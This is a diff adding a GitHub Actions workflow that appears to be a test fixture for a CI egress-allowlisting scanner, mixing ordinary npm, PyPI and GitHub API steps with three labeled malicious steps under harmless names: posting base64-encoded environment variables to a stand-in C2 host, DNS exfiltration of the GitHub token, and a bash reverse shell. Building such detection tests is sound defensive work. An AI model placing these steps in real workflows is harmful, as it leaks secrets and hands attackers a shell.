@@ -1,0 +1,48 @@
+# ============================================================================
+# SCENARIO 17: Egress Exfiltration vs Smart Allowlisting
+# ============================================================================
+# This workflow mixes legitimate network calls (npm, PyPI, GitHub API)
+# with actual exfiltration attempts. SCG's smart egress allowlisting
+# should PASS the legitimate calls and ALERT only on the malicious ones.
+#
+# SCG Detection: Network Scanner + Egress Allowlisting Engine
+# Expected: Legitimate calls = ALLOWED, C2/exfil = BLOCKED
+# ============================================================================
+
+name: "Build & Deploy (MIXED TRAFFIC)"
+on:
+  push:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # ✅ LEGITIMATE: npm registry (pre-trusted)
+      - name: Install dependencies
+        run: npm ci
+
+      # ✅ LEGITIMATE: GitHub API call (pre-trusted)
+      - name: Check release
+        run: curl -s https://api.github.com/repos/owner/repo/releases/latest
+
+      # ✅ LEGITIMATE: PyPI download (pre-trusted)
+      - name: Install Python deps
+        run: pip install requests pyyaml
+
+      # ⚠️ MALICIOUS: Data exfiltration to unknown domain
+      - name: Upload telemetry
+        run: |
+          curl -s https://c2-panel.darkweb.onion/exfil -d "$(env | base64)"
+
+      # ⚠️ MALICIOUS: DNS exfiltration
+      - name: Resolve dependencies
+        run: |
+          nslookup $(cat $GITHUB_TOKEN | base64).leak.evil-dns.com
+
+      # ⚠️ MALICIOUS: Reverse shell to IP address (no hostname)
+      - name: Debug connection
+        run: |
+          bash -i >& /dev/tcp/203.0.113.42/4444 0>&1
